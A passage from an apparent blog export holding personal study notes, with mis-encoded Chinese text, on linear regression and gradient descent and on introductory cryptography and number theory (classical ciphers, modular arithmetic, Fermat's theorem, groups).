regression with one variable.Univariate linear regression.(one variable)</p><h2 id="2-2ä»£ä»·å‡½æ•°-ä¸€"><a href="#2-2ä»£ä»·å‡½æ•°-ä¸€" class="headerlink" title="2.2ä»£ä»·å‡½æ•°(ä¸€)"></a>2.2ä»£ä»·å‡½æ•°(ä¸€)</h2><p><img src="https://i.loli.net/2021/03/06/U9H7TZXSpEtYdaj.png" alt=""></p><p>Cost function  </p><script type="math/tex; mode=display">J(\theta_0,\theta_1)=\frac 1{2m}\sum_{i=1}^m(h_{\theta}(x^{(i)}-y^{(i)})^2</script><h2 id="2-3ä»£ä»·å‡½æ•°-äºŒ"><a href="#2-3ä»£ä»·å‡½æ•°-äºŒ" class="headerlink" title="2.3ä»£ä»·å‡½æ•°(äºŒ)"></a>2.3ä»£ä»·å‡½æ•°(äºŒ)</h2><p><img src="https://i.loli.net/2021/03/06/jwi5Mp2K8b3CLPq.png" alt=""></p><p><img src="https://i.loli.net/2021/03/06/4sFmDZuqdGVTi7S.png" alt=""></p><p>ç®€åŒ–ä»£ä»·å‡½æ•°ä½¿å¾—$\theta_0 = 0$ï¼Œç†è§£ä»£ä»·å‡½æ•°</p><p>å¯¹äºä¸Šå›¾ç‰¹æ®Šçš„training setï¼Œå¯ä»¥æ‰¾å‡º$\theta_1 = 1$æ—¶ï¼Œå¯ä»¥å®Œç¾æ‹Ÿåˆ</p><h2 id="2-4ä»£ä»·å‡½æ•°-ä¸‰"><a href="#2-4ä»£ä»·å‡½æ•°-ä¸‰" class="headerlink" title="2.4ä»£ä»·å‡½æ•°(ä¸‰)"></a>2.4ä»£ä»·å‡½æ•°(ä¸‰)</h2><p>å½“æˆ‘ä»¬ä½¿ç”¨$\theta_0$å’Œ$\theta_1$æ—¶ï¼Œå¾—åˆ°cost functionå›¾åƒç±»ä¼¼ä¸‹å›¾</p><p><img src="https://i.loli.net/2021/03/06/skDZCp4OwtTFYib.png" alt=""></p><p>ä½¿ç”¨ç­‰é«˜çº¿çš„æ–¹å¼æ¥æ¨¡æ‹Ÿï¼Œæƒ³è±¡ä»ç¢—çš„ä¸Šæ–¹å‘åº•éƒ¨çœ‹ï¼Œminimize J($\theta_0$,$\theta_1$) å°±æ˜¯æ¤­åœ†çš„ä¸­å¿ƒï¼Œå¦‚ä¸‹å›¾çš„æ•°æ®æ‹Ÿåˆè¾ƒä¸ºä¸é”™ï¼Œcost valueå¯ä»¥æ¥å—</p><p><img src="https://i.loli.net/2021/03/06/JVmZ7oFTpRDU1zd.png" alt=""></p><h2 id="2-5-æ¢¯åº¦ä¸‹é™"><a href="#2-5-æ¢¯åº¦ä¸‹é™" class="headerlink" title="2.5 æ¢¯åº¦ä¸‹é™"></a>2.5 æ¢¯åº¦ä¸‹é™</h2><p>Repeat until convergence{</p><p>â€‹    $\theta_j := \theta_j - \alpha\frac{\partial}{\partial\theta_j}J(\theta_0,\theta_1)  $        (for j = 0 and j = 1) </p><p>}</p><p>// := assignment       ( a := a + 1)</p><p>// $\alpha$ä¸ºå­¦ä¹ ç‡ï¼Œå¤§çš„æ—¶å€™ä¸‹å±±æ­¥å­å¤§</p><p><img src="https://i.loli.net/2021/03/09/gQYal6ocdpKqC9R.png" alt="æ¢¯åº¦ä¸‹é™1.png" style="zoom:50%;" /></p><h2 id="2-6-æ¢¯åº¦ä¸‹é™ç†è§£"><a href="#2-6-æ¢¯åº¦ä¸‹é™ç†è§£" class="headerlink" title="2.6 æ¢¯åº¦ä¸‹é™ç†è§£"></a>2.6 æ¢¯åº¦ä¸‹é™ç†è§£</h2><ul><li>æ¢¯åº¦ä¸‹é™å¯¼æ•°é¡¹çš„æ„ä¹‰</li></ul><p><img src="https://i.loli.net/2021/03/09/CyXR7G4TLIKQO1w.png" alt="æ¢¯åº¦ä¸‹é™2.png" style="zoom:50%;" /></p><ul><li>æ¢¯åº¦ä¸‹é™å­¦ä¹ ç‡å¤§å°çš„æ„ä¹‰</li></ul><p><img src="https://i.loli.net/2021/03/09/N1mFSpIkrPAnljb.png" alt="æ¢¯åº¦ä¸‹é™3-alphaå«ä¹‰.png" style="zoom:50%;" /></p><ul><li>æ¢¯åº¦ä¸‹é™åˆ°å±€éƒ¨æœ€ä¼˜ç‚¹çš„ç»“æœ</li></ul><p><img src="https://i.loli.net/2021/03/09/nSg2xDTV7yROecG.png" alt="æ¢¯åº¦ä¸‹é™4-å±€éƒ¨æœ€ä¼˜ç‚¹çš„ç»“æœ.png" style="zoom:50%;" /></p><h2 id="2-7-çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™"><a href="#2-7-çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™" class="headerlink" title="2.7 çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™"></a>2.7 çº¿æ€§å›å½’çš„æ¢¯åº¦ä¸‹é™</h2><p>æ¢¯åº¦ä¸‹é™ä¸­å¯¼æ•°é‚£ä¸€é¡¹ï¼š</p><script type="math/tex; mode=display">\frac\partial{\partial\theta_j}J(\theta_0,\theta_1) = \frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})^2 \\=\frac\partial{\partial\theta_j}\frac1{2m}\sum_{i=1}^m(\theta_0 + \theta_1x^{i}-y^{(i)})^2</script><p>$\theta_0$å’Œ$\theta_1$æƒ…å†µä¸‹çš„åå¯¼æ•°ï¼š</p><script type="math/tex; mode=display">j=0:\frac\partial{\partial\theta_0}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)}) \\j=1:\frac\partial{\partial\theta_1}J(\theta_0,\theta_1)=\frac1{m}\sum_{i=1}^m(h_\theta(x^{(i)})-y^{(i)})*x^{(i)}</script><p>è¯¥æ–¹æ³•æ˜¯Batchæ¢¯åº¦ä¸‹é™æ³•ï¼šéœ€è¦éå†æ•´ä¸ªè®­ç»ƒé›†</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Machine Learning </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦ç¬”è®°</title>
      <link href="2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/05/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€-å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç "><a href="#ä¸€-å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç " class="headerlink" title="ä¸€.å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç "></a>ä¸€.å¯†ç å­¦æ¦‚è¿°å’Œå¤å…¸å¯†ç </h1><h2 id="åŸºæœ¬æ¦‚å¿µ"><a href="#åŸºæœ¬æ¦‚å¿µ" class="headerlink" title="åŸºæœ¬æ¦‚å¿µ"></a>åŸºæœ¬æ¦‚å¿µ</h2><p><strong>å¯†ç ç¼–ç å­¦</strong>å’Œå¯†ç åˆ†æå­¦</p><blockquote><p>Plaintext:æ˜æ–‡ï¼Œè¢«éšè”½æ¶ˆæ¯ï¼ŒM</p><p>Ciphertext:å¯†æ–‡ï¼ŒC</p><p>Encryption:åŠ å¯†</p><p>Decryption:è§£å¯†ï¼ŒåŠ å¯†çš„é€†è¿‡ç¨‹</p><p>Encryption algorithm: åŠ å¯†ç®—æ³•ï¼ŒE()</p><p>Decryption algorithm: è§£å¯†ç®—æ³•ï¼ŒD()</p><p>Key: å¯†é’¥ï¼Œæ§åˆ¶åŠ å¯†å’Œè§£å¯†ç®—æ³•æ“ä½œçš„æ•°æ®å¤„ç†ï¼Œåˆ†åˆ«ç§°ä½œåŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ï¼Œk</p></blockquote><ul><li>ä¼ ç»Ÿå¯†ç ä½“åˆ¶æ‰€ç”¨çš„åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ç›¸åŒæˆ–<strong>å®è´¨ä¸Šç­‰åŒ</strong>ï¼Œä»ä¸€ä¸ªæ˜“äºæ¨å‡ºå¦ä¸€ä¸ªï¼šå•é’¥æˆ–å¯¹ç§°å¯†ç ä½“åˆ¶ï¼Œæ— æ³•å®ç°ä¸å¯å¦è®¤æ€§</li><li>åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥ä¸ç›¸åŒï¼Œä»ä¸€ä¸ªéš¾äºæ¨å‡ºå¦ä¸€ä¸ªï¼ŒåŒé’¥ï¼Œæˆ–éå¯¹ç§°å¯†ç ä½“åˆ¶</li></ul><p>å¯†ç ä½“ç³»æ˜¯ä¸€ä¸ªäº”å…ƒç»„(M C K E D)</p><p>å¯†é’¥ç©ºé—´Kï¼Œåœ¨å•é’¥ä½“åˆ¶ä¸‹K1 = K2 = K</p><p>åŠ å¯†å˜æ¢$E_{k1}$</p><p>è§£å¯†å˜æ¢$D_{k2}$</p><p><strong>(M C K $E<em>{k1}$ $D</em>{k2}$)ä¸ºä¿å¯†é€šä¿¡ç³»ç»Ÿ</strong></p><p>å¯†ç åˆ†æè€…ï¼Œé€‰å®šå˜æ¢å‡½æ•°hï¼Œå¯¹cè¿›è¡Œå˜æ¢ï¼Œå¾—åˆ°çš„æ˜æ–‡æ˜¯æ˜æ–‡ç©ºé—´ä¸­çš„æŸä¸ªå…ƒç´ ï¼Œ</p><p>å³$mâ€™ = h(x)$</p><p>å¦‚æœmâ€™ = mï¼Œåˆ™åˆ†ææˆåŠŸ</p><h3 id="ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚"><a href="#ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚" class="headerlink" title="ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚"></a>ä¿å¯†ç³»ç»ŸåŸºæœ¬è¦æ±‚</h3><ol><li>ç†è®ºä¸Šä¸å¯ç ´ï¼Œå³ $ p_r{mâ€™=m}=0 $ï¼Œå½“çŸ¥é“å·²çŸ¥çš„æ˜æ–‡å¯†æ–‡æ—¶ï¼Œè¦å†³å®šå¯†é’¥æˆ–ä»»æ„æ˜æ–‡åœ¨è®¡ç®—ä¸Šæ˜¯ä¸å¯è¡Œçš„</li><li>KerchhoffåŸåˆ™ï¼Œä¿å¯†æ€§ä¸ä¾èµ–äºåŠ å¯†ä½“åˆ¶æˆ–ç®—æ³•çš„ä¿å¯†ï¼Œè€Œä¾èµ–äºå¯†é’¥</li><li>åŠ å¯†è§£å¯†ç®—æ³•é€‚ç”¨äºæ‰€æœ‰å¯†é’¥ç©ºé—´ä¸­çš„å…ƒç´ </li><li>ç³»ç»Ÿä¾¿äºå®ç°å’Œä½¿ç”¨</li></ol><h3 id="å¯†ç ç³»ç»Ÿçš„æ”»å‡»"><a href="#å¯†ç ç³»ç»Ÿçš„æ”»å‡»" class="headerlink" title="å¯†ç ç³»ç»Ÿçš„æ”»å‡»"></a>å¯†ç ç³»ç»Ÿçš„æ”»å‡»</h3><ul><li>æƒŸå¯†æ–‡æ”»å‡»</li><li>å·²çŸ¥æ˜æ–‡æ”»å‡»</li><li>é€‰æ‹©æ˜æ–‡æ”»å‡»</li><li>é€‰æ‹©å¯†æ–‡æ”»å‡»</li></ul><div class="table-container"><table><thead><tr><th>æ”»å‡»ç±»å‹</th><th style="text-align:left">æ”»å‡»è€…æŒæ¡çš„å†…å®¹</th><th></th></tr></thead><tbody><tr><td>æƒŸå¯†æ–‡æ”»å‡»</td><td style="text-align:left">åŠ å¯†ç®—æ³•ï¼Œæˆªè·çš„éƒ¨åˆ†å¯†æ–‡</td><td></td></tr><tr><td>å·²çŸ¥æ˜æ–‡æ”»å‡»</td><td style="text-align:left">ä»¥ä¸ŠåŠä¸€ä¸ªæˆ–å¤šä¸ªæ˜æ–‡å¯†æ–‡å¯¹</td><td></td></tr><tr><td>é€‰æ‹©æ˜æ–‡æ”»å‡»</td><td style="text-align:left">è‡ªå·±é€‰æ‹©çš„æ˜æ–‡æ¶ˆæ¯åŠç”±å¯†é’¥äº§ç”Ÿçš„å¯†æ–‡</td><td></td></tr><tr><td>é€‰æ‹©å¯†æ–‡æ”»å‡»</td><td style="text-align:left">è‡ªå·±é€‰æ‹©çš„å¯†æ–‡æ¶ˆæ¯åŠç›¸åº”çš„è¢«è§£å¯†çš„æ˜æ–‡</td><td></td></tr><tr><td></td><td style="text-align:left"></td></tr></tbody></table></div><p>æ— æ¡ä»¶å®‰å…¨ï¼šæ— è®ºæ•Œæ‰‹æˆªè·å¤šå°‘å¯†æ–‡ï¼ŒèŠ±è´¹å¤šé•¿æ—¶é—´éƒ½ä¸èƒ½è§£å¯†å¯†æ–‡ ï¼ˆä¸€æ¬¡ä¸€å¯†</p><p>è®¡ç®—ä¸Šå®‰å…¨ï¼š1ï¼Œç ´è¯‘å¯†æ–‡çš„ä»£ä»·è¶…è¿‡è¢«åŠ å¯†ä¿¡æ¯çš„ä»·å€¼ã€‚2ï¼Œç ´è¯‘å¯†æ–‡æ‰€èŠ±çš„æ—¶é—´è¶…è¿‡ä¿¡æ¯çš„æœ‰ç”¨æœŸã€‚</p><h2 id="å¯†ç å­¦å‘å±•"><a href="#å¯†ç å­¦å‘å±•" class="headerlink" title="å¯†ç å­¦å‘å±•"></a>å¯†ç å­¦å‘å±•</h2><p>Cryptology - å¯†ç å­¦</p><blockquote><p>ä¸‰ä¸ªé˜¶æ®µï¼š</p><p>1.1949ä¹‹å‰ï¼šå¤å…¸å¯†ç  è‰ºæœ¯</p><p>2.1949-1975ï¼šè¿‘ä»£å¯†ç  è‰ºæœ¯-&gt;ç§‘å­¦</p><p>3.1976å¹´è‡³ä»Šï¼šç°ä»£å¯†ç </p></blockquote><p>å¤å…¸å¯†ç ï¼š</p><ol><li>æ–¯å·´è¾¾æ£ã€‚ç®—æ³•æ˜¯ç¼ ç»•ï¼Œå¯†é’¥æ˜¯æ£å­çš„ç²—ç»†ã€‚</li><li>å•è¡¨ä»£æ¢å¯†ç ï¼šå‡¯æ’’å¯†ç ï¼Œå•å­—æ¯ä»£æ¢ã€‚ç®—æ³•æ˜¯ä»£æ¢ï¼Œå¯†é’¥æ˜¯å¯†ç è¡¨ã€‚</li><li>å¤šè¡¨ä»£æ¢å¯†ç ï¼šEnigmaå¯†ç æœºã€‚</li></ol><p>è¿‘ä»£å¯†ç ï¼š</p><ol><li>1977å¹´ï¼ŒNBSé¢å¸ƒé‡‡çº³IBMè®¾è®¡çš„æ–¹æ¡ˆä½œä¸ºéæœºå¯†æ•°æ®çš„æ•°æ®åŠ å¯†æ ‡å‡†DESï¼ŒData Encryption Standardã€‚</li><li>2001.11.16ï¼Œé‡‡ç”¨AESç®—æ³•</li><li>1976ï¼ŒW.Diffieï¼ŒM.E.Hellmanï¼Œæå‡ºéå¯¹ç§°å¯†ç ç®—æ³•æ€æƒ³</li><li>1977ï¼ŒRivestï¼ŒShamirï¼ŒAdlemanæå‡ºRSAå¯†ç ä½“åˆ¶</li></ol><p>å…¬é’¥å¯†ç å­¦å®ç°åŠ å¯†å¯†é’¥å’Œè§£å¯†å¯†é’¥çš„åˆ†ç¦»ï¼Œä¼Ÿå¤§é©å‘½ï¼Œä½¿ç”¨ä¸¤ä¸ªå¯†é’¥ï¼šå…¬é’¥ï¼Œç§é’¥</p><h2 id="ä»¿å°„å˜æ¢"><a href="#ä»¿å°„å˜æ¢" class="headerlink" title="ä»¿å°„å˜æ¢"></a>ä»¿å°„å˜æ¢</h2><p>$c = E_{a,b}(m) \equiv am + b(mod26)$</p><p>$m = D_{a,b}(c) \equiv a^{-1} + (c - b)(mod26)$</p><p>å½“aå’Œ26äº’ä¸ºç´ æ•°çš„æ—¶å€™æ‰å¯ä»¥è§£å¯† æœ€å¤§å…¬å› å­ä¸º1æ—¶æ‰äº’ä¸ºç´ æ•° ï¼ˆä¸äº’ç´ çš„è¯é€†å…ƒæ±‚ä¸å‡ºæ¥ï¼Œå°±æ²¡æ³•è§£å¯†</p><p>abä¸ºå¯†é’¥</p><p>$a^{-1}$ä¸ºaçš„é€†å…ƒ</p><h3 id="å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹"><a href="#å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹" class="headerlink" title="å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹"></a>å•è¡¨ä»£æ¢ä¼˜ç¼ºç‚¹</h3><p>é¢‘æ¬¡é—®é¢˜</p><p>ç›¸å¯¹ä½ç½®é—®é¢˜</p><h2 id="ç»´å‰å°¼äºšå¯†ç "><a href="#ç»´å‰å°¼äºšå¯†ç " class="headerlink" title="ç»´å‰å°¼äºšå¯†ç "></a>ç»´å‰å°¼äºšå¯†ç </h2><p>åŠ å¯†ç®—æ³•</p><p>$c<em>{i+td}=E_k(m</em>{i+td})\equiv(m_{i+td}+k_i)(mod q)$</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>1.ç†è§£ä¿å¯†é€šä¿¡ç³»ç»Ÿæ¨¡å‹</p><p>2.å¯†ç ä½“åˆ¶ä»åŸç†åˆ†ä¸ºä¸¤å¤§ç±»ï¼Œå•é’¥å’ŒåŒé’¥ä½“åˆ¶</p><p>3.åŠ å¯†ç®—æ³•ä¸¤æ¡å®‰å…¨å‡†åˆ™</p><p>4.èƒ½å¤Ÿè®¡ç®—ä»¿å°„å˜æ¢</p><p>5.ç½®æ¢å¯†ç çš„æ“ä½œ</p><h1 id="äºŒ-å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†"><a href="#äºŒ-å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†" class="headerlink" title="äºŒ.å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†"></a>äºŒ.å¯†ç å­¦ç›¸å…³æ•°å­¦çŸ¥è¯†</h1><h2 id="1-ç´ æ•°å’Œäº’ç´ "><a href="#1-ç´ æ•°å’Œäº’ç´ " class="headerlink" title="1.ç´ æ•°å’Œäº’ç´ "></a>1.ç´ æ•°å’Œäº’ç´ </h2><ul><li><p>å› å­</p><ul><li>bèƒ½æ•´é™¤aï¼Œb|a : bæ˜¯açš„å› å­</li><li>b|1    b = $\pm$1</li><li>b|a a|b åˆ™ a=$\pm$b</li><li>b|a  b|c. åˆ™å¯¹äºä»»æ„æ•´æ•°må’Œn  -&gt; b|(am+cn)</li></ul></li><li><p>ç´ æ•°</p><ul><li>ç´ æ•°æ˜¯ç°ä»£æ•°è®ºçš„æ ¸å¿ƒå†…å®¹</li><li>pçš„å› å­åªæœ‰ $\pm$1å’Œ $\pm$p</li><li>æ•´æ•°åˆ†è§£çš„å”¯ä¸€æ€§å®šç† ä»»ä¸€æ­£æ•´æ•°å¯ä»¥å”¯ä¸€åˆ†è§£æˆç´ æ•°çš„ä¹˜ç§¯<ul><li>$a = p_1^{e_1} + p_2^{e_2} + â€¦ + p_t^{e_t}$</li><li>$e_i$æ˜¯æ­£æ•´æ•° $p_i$æ˜¯ç´ æ•°</li></ul></li></ul></li><li><p>äº’ç´ æ•° </p><ul><li>cæ˜¯aå’Œbçš„æœ€å¤§å…¬å› å­ c=gcd(a,b)</li><li>å› ä¸ºæ‰€æœ‰ä¸ä¸º0çš„æ•´æ•°éƒ½æ˜¯0çš„å› å­ï¼Œå› æ­¤ï¼Œgcd(a,0) = |a|</li><li><p>å¦‚æœgcd(a,b) = 1ï¼Œåˆ™ç§°aï¼Œbæ˜¯äº’ç´ çš„</p></li><li><p>æœ€å°å…¬å€æ•° lcmã€‚dæ˜¯aå’Œbçš„æœ€å°å…¬å€æ•°ï¼Œd=lcm(a,b)</p></li><li>è‹¥gcd(a,b) = 1ï¼Œåˆ™lcm(a,b) = a * b</li></ul></li></ul><h2 id="2-æ¨¡è¿ç®—"><a href="#2-æ¨¡è¿ç®—" class="headerlink" title="2.æ¨¡è¿ç®—"></a>2.æ¨¡è¿ç®—</h2><ul><li><p>æ•°è®º</p><ul><li><p>æ˜¯å¯†ç å­¦ç‰¹åˆ«æ˜¯å…¬é’¥å¯†ç å­¦çš„åŸºæœ¬å·¥å…·</p></li><li><p>ç¦»æ•£çš„æ•°å­—é›†åˆ</p></li><li><p>è¿ç®—æ˜¯æ¨¡åŠ ï¼Œæ¨¡å‡ï¼Œé€†è¿ç®—</p></li><li><p>å¯¹æ•´æ•°å’Œå¤šé¡¹å¼è¿›è¡Œæ¨¡è¿ç®—</p></li><li><p>å­—æ¯çš„é€šç”¨è¡¨ç¤ºï¼š</p><ul><li>n: éè´Ÿæ•´æ•°</li><li><p>p: ç´ æ•°</p></li><li><p>Z: æ•´æ•°é›†åˆ</p></li><li>R: å®æ•°é›†åˆ</li><li><p>Q: æœ‰ç†æ•°é›†åˆ</p></li><li><p>$Z_n$ = {0,1,2â€¦n-1}å°äºnçš„éè´Ÿæ•´æ•°é›†åˆ</p></li></ul></li></ul></li><li><p>æ¨¡è¿ç®—</p><ul><li>a = $\lfloor a/n\rfloor$ n + (a mod n)</li></ul></li><li><p>åŒä½™</p><ul><li>a mod n= b mod n    a $\equiv$ b mod n</li><li>n|(a-b) ç­‰ä»·a $\equiv$ b mod n</li></ul></li><li><p>åŒä½™æ€§è´¨</p><ul><li>a $\equiv$ b mod nï¼Œåˆ™b $\equiv$ a mod n</li><li>a $\equiv$ b mod nï¼Œb $\equiv$ c mod nï¼Œåˆ™a $\equiv$ c mod n</li><li>a $\equiv$ b mod nï¼Œdï½œnï¼Œåˆ™a $\equiv$ b mod d</li><li>a $\equiv$ b mod $n_i$ ï¼Œ d = lcm($n_1,n_2,â€¦n_k$)ï¼Œåˆ™a $\equiv$ b mod dï¼Œ(i = 1,2,â€¦,k)</li></ul></li><li><p>åŒä½™ç±»/ç­‰ä»·ç±»/æ¨¡nå‰©ä½™ç±»</p><ul><li>ä¸aæ¨¡nåŒä½™çš„å…¨ä½“æˆä¸ºaçš„åŒä½™ç±»è®°ä¸º$[a]_n$</li><li>$Z_n$ä¸ºæ¨¡nçš„ç­‰ä»·ç±»é›†åˆ</li></ul></li><li><p>ç­‰ä»·ç±»æ€§è´¨</p><ul><li>åœ¨åšmod nçš„åŠ æ³•å’Œä¹˜æ³•æ—¶ï¼Œç­‰ä»·ç±»çš„å…ƒç´ å¯ä»¥æ›¿æ¢ï¼Œç»“æœä¸å˜</li></ul></li><li><p>æ¨¡è¿ç®—æ€§è´¨</p><ul><li>åŠ è¿ç®—å’Œä¹˜è¿ç®—å…ˆåšæ¨¡å’Œååšæ¨¡ä¸å½±å“ç»“æœ</li><li>æ»¡è¶³äº¤æ¢å¾‹ï¼Œç»“åˆå¾‹ï¼Œåˆ†é…å¾‹</li><li>å•ä½å…ƒï¼Œ0æ˜¯åŠ æ³•å•ä½å…ƒï¼Œ1æ˜¯ä¹˜æ³•å•ä½å…ƒ</li></ul></li></ul><h2 id="3-æ¨¡æŒ‡æ•°è¿ç®—"><a href="#3-æ¨¡æŒ‡æ•°è¿ç®—" class="headerlink" title="3.æ¨¡æŒ‡æ•°è¿ç®—"></a>3.æ¨¡æŒ‡æ•°è¿ç®—</h2><p>æ¨¡æŒ‡æ•°è¿ç®—</p><ul><li>$a^m \pmod p$</li><li>æ€è·¯ï¼šç°å°†mç”¨äºŒè¿›åˆ¶è¡¨ç¤º</li><li>ï¼Ÿå¿«é€ŸæŒ‡æ•°è¿ç®—æŸ¥è¯¢</li><li>é˜¶ $ord_n(a)$ï¼Œ æ»¡è¶³ $a^m \equiv $ 1 mod n çš„æœ€å°æ­£æ•´æ•°mä¸ºæ¨¡nä¸‹açš„é˜¶</li><li>$ord_n(a)$ = mï¼Œ$ a^k \equiv 1$ mod nçš„å……è¦æ¡ä»¶æ˜¯kä¸ºmçš„å€æ•°</li></ul><h2 id="4-è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†"><a href="#4-è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†" class="headerlink" title="4.è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†"></a>4.è´¹é©¬å®šç†å’Œæ¬§æ‹‰å®šç†</h2><ul><li>è´¹é©¬å®šç†<ul><li>pæ˜¯ç´ æ•°ï¼Œaæ˜¯æ­£æ•´æ•°ï¼Œä¸”gcd(a,p) = 1,åˆ™$a^{p-1}\equiv1$ mod p</li><li>$aa^{p-2}\equiv$ mod p æˆ–è€… $a^{-1} \equiv a^{p-2}$ mod p</li><li>$2^{100}  $ mod 13 = 3 (æ»¡è¶³è´¹é©¬å®šç†ï¼Œå³$2^{12} \equiv 1$ mod 13ï¼Œå³$2^{96} \equiv 1$ mod 13)  </li></ul></li></ul><h2 id="5-ç´ æ€§æ£€æµ‹"><a href="#5-ç´ æ€§æ£€æµ‹" class="headerlink" title="5.ç´ æ€§æ£€æµ‹"></a>5.ç´ æ€§æ£€æµ‹</h2><p>ç´ æ€§æ£€æµ‹å°±æ˜¯å¯¹ç»™å®šçš„æ•°æ£€éªŒæ˜¯å¦ä¸ºç´ æ•°</p><p>è´¹é©¬å®šç†çš„é€†å‘½é¢˜ä¸æˆç«‹ï¼Œä¼ªç´ æ•°ï¼ˆå¡ç±³æ­‡å°”æ•°ï¼‰</p><ul><li>åŸƒæ‹‰æ‰˜æ–¯æ•£ç­›æ³•</li><li><p>Miller-Rabinæ¦‚ç‡æ£€æµ‹æ³•</p><h2 id="6-æ¬§å‡ é‡Œå¾—ç®—æ³•"><a href="#6-æ¬§å‡ é‡Œå¾—ç®—æ³•" class="headerlink" title="6.æ¬§å‡ é‡Œå¾—ç®—æ³•"></a>6.æ¬§å‡ é‡Œå¾—ç®—æ³•</h2></li></ul><p>è¾—è½¬ç›¸é™¤æ³•</p><h2 id="7-ä¸­å›½å‰©ä½™å®šç†"><a href="#7-ä¸­å›½å‰©ä½™å®šç†" class="headerlink" title="7.ä¸­å›½å‰©ä½™å®šç†"></a>7.ä¸­å›½å‰©ä½™å®šç†</h2><p>å°æ•°é‡æ„å¤§æ•°</p><p>å¤§æ•°ç”¨å°æ•°è¡¨ç¤º</p><h2 id="8-ç¾¤ç¯åŸŸ"><a href="#8-ç¾¤ç¯åŸŸ" class="headerlink" title="8.ç¾¤ç¯åŸŸ"></a>8.ç¾¤ç¯åŸŸ</h2><ul><li><p>ä»£æ•°ç³»ç»Ÿ</p><ul><li>ä»£æ•°ç³»ç»Ÿæ˜¯ä¸€ç§æ•°å­¦æ¨¡å‹ï¼ŒåŒ…å«è¦å¤„ç†çš„æ•°å­¦å¯¹è±¡çš„é›†åˆåŠé›†åˆä¸Šçš„å…³ç³»æˆ–è¿ç®—ã€‚</li><li>ç¾¤ï¼Œç¯ï¼ŒåŸŸéƒ½æ˜¯ä»£æ•°ç³»ç»Ÿã€‚</li></ul></li><li><p>åŠç¾¤</p><ul><li>ä»»å–abå±äºSï¼Œaå’Œbçš„è¿ç®—*éƒ½åœ¨Sä¸­ï¼Œåˆ™Så¯¹è¿ç®—*æ˜¯å°é—­çš„</li><li>æ»¡è¶³ç»“åˆå¾‹</li><li>æ»¡è¶³ä»¥ä¸Šä¸¤ç‚¹ï¼Œç§°ä¸º<G,*>ä¸ºåŠç¾¤</li></ul></li><li><p>ç¾¤</p><ul><li>å°é—­æ€§</li><li>ç»“åˆå¾‹</li><li>å•ä½å…ƒï¼š$a<em>e = e</em>a = a$ï¼Œeç§°ä¸º$<G,*>$çš„å•ä½å…ƒ</li><li>é€†å…ƒï¼šå¯¹ä»»å–aå±äºGï¼Œå­˜åœ¨å…ƒç´ $a^{-1}$,$a <em> a^{-1} = a^{-1} </em> a = e$</li><li>æ»¡è¶³ä»¥ä¸Šå‡ ç‚¹ç§°ä¸º$<G,*>$æ˜¯ç¾¤</li><li>å®ä¾‹ $<Z_8,+>$ï¼Œæ¨¡8åŠ </li><li>å®ä¾‹ XORï¼Œæ¨¡2åŠ </li><li>å®ä¾‹ï¼ŒåŠ æ³•ç¾¤<ul><li>å¯¹ä»»æ„nå¤§äºç­‰äº1ï¼Œæ•´æ•°æ¨¡nçš„é›†åˆæ„æˆä¸€ä¸ªåŒ…å«nä¸ªå…ƒç´ çš„æœ‰é™æ¨¡nåŠ æ³•ç¾¤ï¼Œå•ä½å…ƒæ˜¯0ï¼Œç¾¤ä¸­ä»»ä¸€å…ƒç´ aï¼Œå®ƒçš„é€†å…ƒæ˜¯n-aï¼Œè¿™ä¸ªç¾¤è®°ä¸º$Z_n$</li></ul></li><li><p>å®ä¾‹ï¼Œä¹˜æ³•ç¾¤ä¸æ˜¯ç¾¤ï¼Œæ˜¯å¹ºåŠç¾¤ï¼Œä¸æ»¡è¶³é€†å…ƒçš„æ¡ä»¶</p></li><li><p>ä¹˜æ³•ç¾¤ $Z_n^*$</p><ul><li>$Z_n^*={x\in Z_n:gcd(x,n)=1}$ï¼Œå°äºnçš„éè´Ÿæ•´æ•°ä¸”ä¸näº’ç´ </li><li>æ¨¡nä¹˜æ³•ç¾¤ï¼Œå•ä½å…ƒe = 1</li><li>æ˜¯abelç¾¤ï¼Œ$|Z_n^*| = \psi(n)$</li><li>å¯¹ç´ æ•°pï¼Œ$Z_p^* = Z_p - 0$</li></ul></li></ul></li></ul><ul><li><p>Abelç¾¤</p><ul><li>è¿ç®—*è¡¨ç¤ºåŠ æ³•æ—¶ï¼Œç§°ä¸ºåŠ æ³•ç¾¤</li><li>ä¹˜æ³•ï¼Œä¹˜æ³•ç¾¤</li><li>è‹¥Gçš„å…ƒç´ 